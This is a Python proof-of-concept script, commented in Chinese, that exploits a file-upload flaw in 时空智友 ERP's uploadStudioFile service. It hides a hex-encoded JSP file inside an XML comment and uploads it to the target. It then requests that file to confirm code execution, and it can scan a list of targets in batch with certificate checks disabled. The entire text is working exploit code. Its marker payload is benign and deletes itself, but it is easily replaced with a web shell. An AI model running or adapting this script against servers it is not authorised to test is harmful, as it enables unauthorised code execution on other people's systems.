#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import argparse
from urllib3.exceptions import InsecureRequestWarning

RED = '\033[91m'
RESET = '\033[0m'
# 忽略证书验证警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def upload_studio_file(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    data = 'content=<?xml%20version="1.0"?><root><filename>test.jsp</filename><filepath>./</filepath><filesize>172</filesize><lmtime>1970-01-01%2008:00:00</lmtime></root><!--%3c%25%20%6f%75%74%2e%70%72%69%6e%74%28%22%3c%70%72%65%3e%22%29%3b%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%31%31%31%20%2a%20%31%31%31%29%3b%6f%75%74%2e%70%72%69%6e%74%28%22%3c%2f%70%72%65%3e%22%29%3b%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%46%69%6c%65%28%61%70%70%6c%69%63%61%74%69%6f%6e%2e%67%65%74%52%65%61%6c%50%61%74%68%28%72%65%71%75%65%73%74%2e%67%65%74%53%65%72%76%6c%65%74%50%61%74%68%28%29%29%29%2e%64%65%6c%65%74%65%28%29%3b%0d%0a%25%3e%0d%0a-->'
    
    upload_url = f"{url.rstrip('/')}/formservice?service=updater.uploadStudioFile"
    shell_url = f"{url.rstrip('/')}/update/temp/studio/test.jsp"
    
    try:
        response = requests.post(upload_url, headers=headers, data=data, verify=False, timeout=30)
        if response.status_code == 200:
            shell_response = requests.get(shell_url, verify=False, timeout=30)
            if shell_response.status_code == 200 and "12321" in shell_response.text:
                print(f"{RED}URL [{url}] 存在时空智友 ERP uploadstudiofile 文件上传漏洞{RESET}")
            else:
                print(f"URL [{url}] 可能不存在漏洞")
        else:
            print(f"URL [{url}] 上传文件失败，响应状态码: {response.status_code}")
    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在时空智友 ERP uploadstudiofile 文件上传漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        upload_studio_file(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                upload_studio_file(url)

if __name__ == '__main__':
    main()
